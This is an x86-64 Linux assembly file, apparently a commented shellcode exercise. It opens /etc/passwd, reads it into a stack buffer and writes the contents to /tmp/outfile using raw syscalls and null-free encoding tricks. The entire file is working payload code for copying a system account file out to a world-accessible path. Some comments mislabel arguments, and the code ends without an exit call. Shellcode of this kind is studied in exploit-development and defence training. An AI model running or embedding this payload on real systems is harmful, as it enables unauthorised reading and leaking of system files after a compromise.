global _start

section .text

_start:

    ; set RAX to 2 (syscall open)
    xor rax, rax
    mov al, 2

    ; 1st argument of open: pointer to the file to open
    ; in this case the file is "/etc/passwd"
    xor rdi, rdi
    mov ebx, 0x647773
    push rbx
    mov rbx, 0x7361702f6374652f
    push rbx
    lea rdi, [rsp]

    ; 2nd argument of open: flags (in this case O_RDONLY)
    xor rsi, rsi

    ; invoke syscall open
    syscall

    ; store the file descriptor of the opened file in RBX
    mov rbx, rax

    ; set RAX to 0 (syscall read)
    xor rax, rax

    ; 1st argument of read: file descriptor of the file
    ; from which to read the bytes
    mov rdi, rbx

    ; 2nd argument of read: pointer to the buffer that will
    ; store the bytes read from the file
    mov rsi, rsp

    ; 3rd argument of read: number of bytes to read from the
    ; file "/etc/passwd"
    mov dx, 0xffff

    ; invoke syscall read
    syscall

    ; store the number of bytes read from "/etc/passwd" into R8
    mov r8, rax

    ; save the value of RSP for later use
    mov rax, rsp

    ; string terminator
    xor rbx, rbx
    push rbx

    ; push the string "/tmp/outfile" to the stack
    mov ebx, 0x656c6966
    push rbx
    mov rbx, 0x74756f2f706d742f
    push rbx

    ; restore the previous value of RBX
    mov rbx, rax

    ; set RAX to 2 (syscall open)
    xor rax, rax
    mov al, 2

    ; 1st argument of open: pointer to the file to open
    lea rdi, [rsp]

    ; 2nd argument of open: flags: O_RDWR|O_CREAT|0x24
    xor rsi, rsi
    push 0x66
    pop si

    ; invoke syscall open
    syscall

    ; save the file descriptor of the opened file into RDI
    mov rdi, rax

    ; set RAX to 1 (syscall write)
    xor rax, rax
    mov al, 1

    ; 2nd argument of write: pointer to buffer containing the
    ; bytes to write
    lea rsi, [rbx]

    ; 3rd argument of open: number of bytes to write inside
    ; the file "/tmp/outfile
    xor rdx, rdx
    mov rdx, r8

    ; invoke syscall write
    syscall
